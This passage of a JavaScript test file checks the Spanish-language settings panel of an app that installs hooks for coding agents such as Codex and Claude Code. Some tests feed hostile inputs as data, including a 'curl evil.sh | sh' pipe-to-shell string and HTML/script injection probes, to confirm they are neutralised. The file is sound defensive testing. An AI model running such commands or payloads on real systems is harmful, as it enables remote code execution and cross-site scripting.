  assert.equal(odd.rows[0].state, 'connected');
});

test('agents: each state is icon + one word with the right button — «Conectar», «Actualizar», «Desconectar» — never a terminal', () => {
  const row = (state, extra = {}) => S.agentsView(agentsState([{ id: 'codex', state, backup: false, detail: null, plan_hash: 'b'.repeat(64), summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first.', reviewable: true, ...extra }])).rows[0];
  const nc = row('not_connected');
  assert.deepEqual([nc.word, nc.tone, nc.primary && nc.primary.label], ['Sin conectar', 'faint', 'Conectar']);
  assert.deepEqual(nc.primary.command, { action: 'agent_connect', agentId: 'codex', plan_hash: 'b'.repeat(64) });
  assert.equal(nc.secondary, null);
  const ok = row('connected');
  assert.deepEqual([ok.word, ok.tone, ok.primary], ['Conectado', 'go', null]);
  assert.deepEqual(ok.secondary, { label: 'Desconectar', command: { action: 'agent_disconnect', agentId: 'codex' } });
  const old = row('outdated');
  assert.equal(old.primary.label, 'Actualizar'); assert.equal(old.primary.command.action, 'agent_connect'); assert.equal(old.primary.command.plan_hash, 'b'.repeat(64)); assert.equal(old.secondary.label, 'Desconectar');
  const work = row('working');
  assert.deepEqual([work.word, work.primary, work.secondary, work.busy], ['En curso', null, null, true]);
  const gone = row('unavailable');
  assert.deepEqual([gone.word, gone.primary, gone.secondary], ['No encontrado', null, null]);
  assert.match(gone.note, /no está instalad/i);
  const bad = row('error', { detail: 'not_writable' });
  assert.equal(bad.word, 'No se pudo'); assert.equal(bad.tone, 'red'); assert.equal(bad.primary.label, 'Reintentar');
  assert.match(bad.note, /permiso/i);
  assert.match(row('error', { detail: 'backup_failed' }).note, /respaldo/i);
  assert.match(row('error', { detail: 'config_invalid' }).note, /config/i);
  assert.ok(row('error', { detail: '<script>' }).note.length > 5, 'an unknown detail reads as a generic sentence, never as text');
  assert.ok(!/<script>/.test(row('error', { detail: '<script>' }).note));
  // a hostile state value is an error, not a free-form chip
  assert.equal(row('<img>').state, 'error');
  assert.ok(!/terminal|comando|consola/i.test(JSON.stringify([nc, ok, old, work, gone, bad])), 'no word asks the human to use a terminal');
});

test('agents: a backup is mentioned when there is one; the list is honest without an engine', () => {
  const ok = S.agentsView(agentsState([{ id: 'claude-code', state: 'connected', backup: true, detail: null }])).rows[0];
  assert.match(ok.note, /respaldo/i);
  assert.equal(S.agentsView(state({ connection: 'no_daemon', agents: null })).kind, 'no_engine');
  assert.equal(S.agentsView(state({ connection: 'connected', agents: null })).kind, 'loading');
  assert.equal(S.agentsView(agentsState([])).kind, 'ready');
  assert.equal(S.agentsView(agentsState([])).rows.length, 0);
});

// ---- verdict settings-gd ---------------------------------------------------------------------------------
test('agents: an engine that does not know agents_list ends the wait honestly — never an endless ring', () => {
  const noFrame = state({ agents: null, last_error: { code: null, n: 0 } });
  assert.equal(S.agentsView(noFrame).kind, 'loading', 'before anything was asked it is a real wait');
  // the engine of TODAY answers agents_list with error{bad_request}: that is «no disponible», not a spinner
  for (const code of ['bad_request', 'unavailable']) {
    const v = S.agentsView(state({ agents: null, last_error: { code, n: 3 } }), { askedAtError: 2 });
    assert.equal(v.kind, 'unsupported', code);
    assert.equal(v.word, 'No disponible'); assert.equal(v.note, 'El motor todavía no puede conectar agentes.');
    assert.ok(v.icon && v.icon !== 'ring', 'no ring');
  }
  // an error that arrived BEFORE the question does not count; the same counter means no new error
  assert.equal(S.agentsView(state({ agents: null, last_error: { code: 'bad_request', n: 3 } }), { askedAtError: 3 }).kind, 'loading');
  // other errors (busy, rate_limited...) are not «unsupported»
  assert.equal(S.agentsView(state({ agents: null, last_error: { code: 'busy', n: 5 } }), { askedAtError: 2 }).kind, 'loading');
  // a real frame always wins
  assert.equal(S.agentsView(state({ agents: [], last_error: { code: 'bad_request', n: 9 } }), { askedAtError: 2 }).kind, 'ready');
  // silence: no frame within the deadline is the same honest answer
  assert.equal(S.agentsView(noFrame, { timedOut: true }).kind, 'unsupported');
  assert.equal(S.agentsView(state({ agents: [{ id: 'codex', state: 'connected' }] }), { timedOut: true }).kind, 'ready');
});

test('agents: the deadline for the engine to answer is a named constant', () => {
  assert.ok(Number.isInteger(S.AGENTS_WAIT_MS) && S.AGENTS_WAIT_MS >= 2000 && S.AGENTS_WAIT_MS <= 10000);
});

test('no human-facing string of the settings page asks for a terminal (state JSON AND the fixed strings of the source)', () => {
  const strip = t => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const literals = text => [...strip(text).matchAll(/(['"`])((?:\\.|(?!\1)[^\\\n])*)\1/g)].map(m => m[2]).filter(x => /[a-záéíóúñ]{3,}/i.test(x));
  const bad = /\b(terminal|consola|l[ií]nea de comandos|comando|shell|bash|cli|sudo|npm|install)\b/i;
  const where = [];
  for (const f of ['settings.js', 'settings-view.js']) {
    for (const lit of literals(fs.readFileSync(path.join(frontend, f), 'utf8'))) if (bad.test(lit) && !/^(agent_|abito:|settings|agents_)/.test(lit)) where.push(`${f}: ${lit}`);
  }
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  const sect = html.slice(html.indexOf('id="settings"'), html.indexOf('id="chat-live"'));
  for (const m of sect.matchAll(/(?:aria-label|title|placeholder)="([^"]*)"/g)) if (bad.test(m[1])) where.push(`index.html: ${m[1]}`);
  assert.deepEqual(where, [], 'a fixed string mentions a terminal or a command');
});

test('copy: voseo everywhere (the human writes in Rioplatense Spanish)', () => {
  const all = JSON.stringify(S.TABS) + fs.readFileSync(path.join(frontend, 'settings-view.js'), 'utf8') + fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.doesNotMatch(all, /Pregunta antes/, '«Pregunta» (tú) -> «Preguntá» (vos)');
  assert.match(S.tabById('connectors').hint, /Preguntá antes de enviar/);
  assert.doesNotMatch(all, /\b(Conecta|Pega|Inicia|Introduce|Elige|Haz|Pulsa|Escribe)\b(?= [a-zñáéíóú])/, 'no tú imperatives');
});

test('verbs follow gentle-dot: «Cerrar sesión» for an account (its Sign out), «Desconectar» for an agent (its Disconnect)', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.doesNotMatch(src, /wordBtn\('Salir'/, 'no «Salir» button');
  assert.match(src, /wordBtn\(V\.LOGOUT_WORD/, 'the button takes its word from the one constant');
  assert.equal(S.LOGOUT_WORD, 'Cerrar sesión');
  assert.equal(S.agentsView(agentsState([{ id: 'codex', state: 'connected' }])).rows[0].secondary.label, 'Desconectar');
});

test('close glyph: the screen closes with a cross (gentle-dot ×), never the ✓ that means «allow» in our vocabulary', () => {
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  const tag = /<button[^>]*id="settings-close"[^>]*>.*?<\/button>/.exec(html);
  assert.ok(tag);
  assert.match(tag[0], /data-icon="cross"/);
  assert.doesNotMatch(tag[0], /data-icon="check"/);
  assert.match(tag[0], /aria-label="Cerrar/);
});

test('chat header: stays visible with a screen open so the human can switch screens with the pointer', () => {
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
  const hidden = [...css.matchAll(/([^{}]*data-settings="open"[^{}]*)\{([^}]*)\}/g)].filter(m => /visibility:\s*hidden/.test(m[2])).map(m => m[1]);
  assert.ok(!hidden.some(sel => /#chat-header/.test(sel)), `a rule hides #chat-header: ${hidden.join(' | ')}`);
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  // the panel must start BELOW the header so both are visible at once
  assert.match(css.slice(css.indexOf('#settings {')), /top:\s*(5\d|6\d)px/);
  assert.ok(html.indexOf('id="chat-header"') < html.indexOf('id="settings"'));
});

// ---- #310: «lento al abrir» — the panel must not claim «Sin motor» before the engine has even been asked -----
test('connecting: no state yet = «Conectando», never the false claim «Sin motor»; the real states keep their words', () => {
  for (const nothing of [null, undefined]) {
    const v = S.connectionView(nothing);
    assert.equal(v.kind, 'connecting'); assert.equal(v.word, 'Conectando'); assert.equal(v.icon, 'ring'); assert.equal(v.tone, 'live');
  }
  assert.equal(S.connectionView({ connection: 'connecting' }).kind, 'connecting');
  assert.equal(S.connectionView({ connection: 'no_daemon' }).word, 'Sin motor', 'a REAL no_daemon still says so');
  assert.equal(S.connectionView({ connection: 'lost' }).word, 'Motor caído');
  assert.equal(S.connectionView({ connection: 'connected' }), null);
  assert.equal(S.connectionView({ connection: 'whatever' }).word, 'Sin motor', 'an unknown state stays the honest default');
});

test('connecting: the lists show a wait («Conectando»), not an empty or «No disponible» result, until the first state arrives', () => {
  assert.equal(S.connectorsView(null).kind, 'loading');
  assert.equal(S.agentsView(null).kind, 'loading');
  assert.equal(S.agentsView(state({ connection: 'connecting', agents: null })).kind, 'loading');
});

test('connecting: the screen draws «Conectando» while the first state is on its way, with a deadline so it can never hang', () => {
  assert.ok(Number.isInteger(S.CONNECT_WAIT_MS) && S.CONNECT_WAIT_MS >= 2000 && S.CONNECT_WAIT_MS <= 10000);
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /CONNECT_WAIT_MS/);
  assert.doesNotMatch(src, /agentState \|\| \{ connection: 'no_daemon'/, 'the stand-in for «no state yet» must not claim the engine is missing');
});

// ---- #310 final contract (H2b): show the plan, send its hash back, refuse a big change, say what to do after Codex ----
const HASH = 'a'.repeat(64);
const plan = (extra = {}) => ({ id: 'claude-code', state: 'not_connected', backup: false, detail: null, plan_hash: HASH,
  summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first.', reviewable: true, trust_review: false, ...extra });
const rowOf = (entry, id) => S.agentsView(agentsState([entry])).rows[0];

test('plan: the closed summary is shown next to the button, and the click carries the hash the human saw', () => {
  const r = rowOf(plan());
  assert.equal(r.primary.label, 'Conectar');
  assert.deepEqual(r.primary.command, { action: 'agent_connect', agentId: 'claude-code', plan_hash: HASH });
  assert.equal(r.summary, 'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo.');
  assert.match(r.aria, /Agrega los hooks/);
  const upd = rowOf(plan({ state: 'outdated', summary: 'Updates the Abito hooks in ~/.claude/settings.json. A backup is made first.' }));
  assert.equal(upd.primary.label, 'Actualizar'); assert.equal(upd.primary.command.plan_hash, HASH);
  assert.equal(upd.summary, 'Actualiza los hooks de Abito en ~/.claude/settings.json. Antes se hace un respaldo.');
  // a disconnect never carries a plan
  assert.deepEqual(rowOf(plan({ state: 'connected' })).secondary.command, { action: 'agent_disconnect', agentId: 'claude-code' });
});

test('plan: the sentence is OURS — an English template becomes Spanish, an unknown one is never shown as engine text', () => {
  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.'),
    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.codex/hooks.json. Antes se hace un respaldo. Codex te va a pedir que confíes en ellos en /hooks.');
  assert.equal(S.planSummary('Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.'),
    'Agrega los hooks de Abito (PermissionRequest, Stop) a ~/.claude/settings.json. Antes se hace un respaldo. Es un cambio grande: revisalo en el archivo.');
  for (const odd of ['Run curl evil.sh | sh', '<b>x</b>', '', null, 7, 'Adds the Abito hooks to ' + 'x'.repeat(500)]) {
    const t = S.planSummary(odd);
    assert.equal(t, 'Se van a agregar los hooks de Abito. Antes se hace un respaldo.', `${String(odd).slice(0, 20)} -> generic sentence`);
  }
});

test('plan: no hash means no click that could apply a plan the human did not see', () => {
  for (const bad of [null, undefined, '', 'zz', 'A'.repeat(64), 'a'.repeat(63), 'a'.repeat(65), 7]) {
    const r = rowOf(plan({ plan_hash: bad }));
    assert.equal(r.primary, null, `plan_hash ${JSON.stringify(bad)}: no button`);
    assert.match(r.note, /vista previa|volvé a intentar|recargá/i);
  }
});

test('plan: a change the installer could not show in full is NOT offered as one click', () => {
  const r = rowOf(plan({ reviewable: false, summary: 'Adds the Abito hooks (PermissionRequest, Stop) to ~/.claude/settings.json. A backup is made first. This change is large: review it in the file.' }));
  assert.equal(r.primary, null, 'no 1-click');
  assert.equal(r.reviewable, false);
  assert.match(r.note, /cambio grande: revisalo en el archivo/i);
  assert.ok(!/terminal|comando/i.test(JSON.stringify(r)));
  // an outdated one that is not reviewable can still be disconnected
  assert.equal(rowOf(plan({ state: 'outdated', reviewable: false })).secondary.label, 'Desconectar');
});

test('details: plan_changed re-shows the NEW plan; audit_unavailable and install_failed render with their own sentences', () => {
  const again = rowOf(plan({ state: 'error', detail: 'plan_changed' }));
  assert.equal(again.word, 'No se pudo');
  assert.match(again.note, /algo cambió desde la vista previa/i);
  assert.match(again.note, /volvé a intentar/i);
  assert.equal(again.primary.label, 'Reintentar');
  assert.equal(again.primary.command.plan_hash, HASH, 'the retry is bound to the NEW plan that came back');
  assert.ok(again.summary, 'the new summary is shown again');
  assert.match(rowOf(plan({ state: 'error', detail: 'audit_unavailable', plan_hash: null, summary: null })).note, /registro|auditor/i);
  assert.match(rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null })).note, /no se tocó|no se pudo/i);
  // an error without a plan cannot be retried blindly with a stale one
  const noPlan = rowOf(plan({ state: 'error', detail: 'install_failed', plan_hash: null, summary: null }));
  assert.equal(noPlan.primary.command.plan_hash, undefined);
  assert.equal(noPlan.primary.label, 'Reintentar');
});

test('trust: after Codex connects the human is told what to do next, in the panel (never a terminal)', () => {
  const r = rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: true });
  assert.match(r.note, /confiá en los hooks/i);
  assert.match(r.note, /\/hooks/);
  assert.equal(r.trust, true);
  assert.equal(rowOf({ id: 'codex', state: 'connected', backup: true, detail: null, trust_review: false }).trust, false);
  assert.equal(rowOf({ id: 'claude-code', state: 'connected', backup: false, detail: null, trust_review: true }).trust, true);
});

test('opencode: always «No encontrado», never a button', () => {
  const r = rowOf({ id: 'opencode', state: 'unavailable', backup: false, detail: null });
  assert.equal(r.primary, null); assert.equal(r.secondary, null); assert.equal(r.word, 'No encontrado');
});

test('wiring: the plan summary is drawn above the button and the trust hint is its own highlighted line', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.match(src, /r\.summary[^\n]*splan/);
  assert.match(src, /strust/);
  assert.ok(src.indexOf("r.summary") < src.indexOf("r.primary.label"), 'the summary comes before the button that approves it');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(css, /\.splan\s*\{/); assert.match(css, /\.strust\s*\{/);
});

test('display name validates scalars and controls, blank clears and markup is text', () => {
  assert.equal(S.displayNameProblem(''), '');
  assert.equal(S.displayNameProblem('   '), '');
  assert.equal(S.displayNameProblem('😀'.repeat(80)), '');
  assert.match(S.displayNameProblem('😀'.repeat(81)), /80/);
  assert.match(S.displayNameProblem('A\nB'), /control/);
  assert.match(S.displayNameProblem('A\u007fB'), /control/);
  assert.equal(S.displayNameProblem('<img src=x onerror=alert(1)>'), '');
});

// ---- #384: the Dot's colour, chosen by the human (avatar-colors.js owns the contract) -------------
const A = require(path.join(frontend, 'avatar-colors.js'));

test('#384 colourRows: the principal is always offered, with the five choices and the current one selected', () => {
  const rows = S.colorRows({}, ['abito'], A);
  assert.equal(rows.length, 1);
  const row = rows[0];
  assert.deepEqual([row.id, row.color, row.label], ['abito', 'green', 'Verde']);
  assert.deepEqual(row.options.map(o => o.color), ['green', 'blue', 'mint', 'orange', 'purple']);
  assert.deepEqual(row.options.map(o => o.label), ['Verde', 'Azul', 'Menta', 'Naranja', 'Púrpura']);
  assert.deepEqual(row.options.filter(o => o.selected).map(o => o.color), ['green']);
  assert.match(row.aria, /Verde/);
  for (const o of row.options) assert.match(o.aria, new RegExp(`${o.label} para abito`));
});

test('#384 colourRows: a stored choice is the selected one, and it survives a reload of the prefs view', () => {
  // exactly the shape the host hands back from `prefs_action {action:'view'}`
  const prefs = { sound: false, avatarColors: { abito: 'purple' } };
  const row = S.colorRows(prefs, ['abito'], A)[0];
  assert.deepEqual([row.color, row.label], ['purple', 'Púrpura']);
  assert.deepEqual(row.options.filter(o => o.selected).map(o => o.color), ['purple']);
  assert.ok(row.options.every(o => typeof o.aria === 'string' && o.aria.length > 0), 'every choice has a name');
});

test('#384 colourRows: no sub-Abito list is invented, and an ignored value is never shown as applied', () => {
  assert.equal(S.colorRows({ avatarColors: { abito: 'chartreuse' } }, ['abito'], A)[0].color, 'green');
  assert.deepEqual(S.colorRows({ avatarColors: { codex: 'blue' } }, ['abito', 'pi', 'codex'], A).map(r => r.id), ['abito'],
    'connectors are not colour rows, even if a file names one');
  assert.deepEqual(S.colorRows({}, [], A), []);
  assert.deepEqual(S.colorRows({}, null, A), []);
  assert.deepEqual(S.colorRows({}, undefined, A), []);
  assert.deepEqual(S.colorRows({}, ['abito'], null), [], 'a missing contract is not a broken control');
  assert.deepEqual(S.colorRows({}, ['abito'], {}), []);
});

test('#384 colourRows: repeated colors are valid, with no warning', () => {
  const rows = S.colorRows({ avatarColors: { abito: 'mint' } }, ['abito', 'sub-abito-uno'], A);
  assert.deepEqual(rows.map(r => r.id), ['abito', 'sub-abito-uno']);
  assert.ok(rows.every(r => !Object.hasOwn(r, 'duplicate')));
  assert.doesNotMatch(JSON.stringify(rows), /secret|token|password/i);
  for (const r of rows) assert.equal(r.options.length, A.PALETTE.length);
});

test('#384 controls: every option has visible text, a 44px target and radio keyboard wiring', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(src, /sdot-label', option.label/);
  assert.match(src, /ArrowRight/);
  assert.match(src, /ArrowLeft/);
  assert.match(src, /b.tabIndex = option.selected/);
  assert.match(src, /b.id = `dot-color-\$\{row.id\}-\$\{option.color\}`/, 'existing render restores stable color IDs after prefs events');
  assert.match(css, /\.sdot \{[^}]*min-width: 44px/);
  assert.match(css, /\.sdot \{[^}]*min-height: 44px/);
});

test('#384 F1: failed color save has inline visible feedback and retains the live region', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(src, /sdot-error/);
  assert.match(src, /aria-describedby/);
  assert.match(src, /colorErrors\[identity\] =/);
  assert.match(src, /delete colorErrors\[identity\]/);
  assert.match(src, /say\(colorErrors\[identity\]\)/);
  const rule = css.match(/\.sdot-error \{([^}]*)\}/);
  assert.ok(rule, 'visible error style');
  assert.doesNotMatch(rule[1], /clip|hidden|display:\s*none/);
});

test('#308 owned account snapshots whitelist fields and reveal presence only', () => {
  const input = { accounts: [{ accountId: 'example', provider: 'openai', hasCredential: true,
    config: { nombre: 'Example', baseUrl: 'https://example.com/v1', api: 'openai-completions', compat: {}, models: ['m'], defaultModel: 'm', apiKey: String.fromCharCode(97,98,99) } }] };
  const rows = S.ownedAccounts(input);
  assert.equal(rows.length, 1);
  assert.equal(rows[0].hasCredential, true);
  assert.equal(rows[0].config.defaultModel, 'm');
  assert.equal(Object.hasOwn(rows[0].config, 'apiKey'), false);
  assert.equal(S.ownedAccounts(null).length, 0);
});
test('#308 configuration is not connection readiness and commands are namespaced', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  for (const action of ['abito_account_save', 'abito_account_create', 'abito_account_endpoint_set']) assert.ok(src.includes(action));
  assert.match(src, /Conexión no probada/);
  assert.match(src, /account-secret/);
  assert.match(src, /accountError/);
});
// ---- #380: the theme row of Ajustes (the painting itself lives in theme.js / theme-check) ----------
test('#380 theme: the panel offers exactly the three closed modes from the SAVED prefs, in voseo-free nouns', () => {
  assert.deepEqual([...S.THEME_MODES], ['system', 'light', 'dark']);
  assert.deepEqual(S.themeView({ theme: 'dark' }).options.map(o => o.id), ['system', 'light', 'dark']);
  assert.deepEqual(S.themeView({ theme: 'dark' }).options.filter(o => o.selected).map(o => o.id), ['dark']);
  assert.deepEqual(S.themeView({ theme: 'light' }).options.filter(o => o.selected).map(o => o.id), ['light']);
  // an absent or damaged stored value is «Sistema»: the panel never shows a mode it cannot persist
  assert.equal(S.themeView({}).mode, 'system');
  assert.equal(S.themeView({ theme: 'chartreuse' }).mode, 'system');
  assert.equal(S.themeView(null).mode, 'system');
  for (const option of S.themeView({}).options) assert.ok(option.label && option.aria, option.id);
  assert.equal(S.THEME_LABELS.system, 'Sistema');
  assert.equal(S.THEME_LABELS.light, 'Claro');
  assert.equal(S.THEME_LABELS.dark, 'Oscuro');
});

test('#380 theme wiring: one closed sender, no local paint, and a failed save keeps the old theme in words', () => {
  const src = fs.readFileSync(path.join(frontend, 'settings.js'), 'utf8');
  assert.equal((src.match(/action: 'set_theme'/g) || []).length, 1, 'set_theme is sent through prefs_action only');
  assert.match(src, /\{ action: 'set_theme', theme: mode \}/);
  assert.doesNotMatch(src, /dataset\.theme|data-theme|setAttribute\('data-theme'/, 'only theme.js paints <html data-theme>');
  assert.match(src, /No se pudo guardar el tema; se mantuvo el anterior\./);
  assert.match(src, /const themePick = V\.themeView\(prefs\)/, 'the row renders from the saved prefs, so a refused save re-renders the truth');
  assert.match(src, /role', 'radiogroup'/);
  assert.match(src, /b\.tabIndex = option\.selected \? 0 : -1/, 'roving tabindex, like the colour radios');
  // the picker ships with the page and its styles exist on both palettes
  const css = fs.readFileSync(path.join(frontend, 'style.css'), 'utf8');
  assert.match(css, /\.stheme \{[^}]*min-height: 44px/);
  assert.match(css, /\.stheme\[aria-checked="true"\]/, 'selection is filled + aria-checked, never colour alone');
  const html = fs.readFileSync(path.join(frontend, 'index.html'), 'utf8');
  assert.match(html, /<script defer src="theme\.js"><\/script>/);
});

console.log(`settings-view-check: ${passed} passed`);
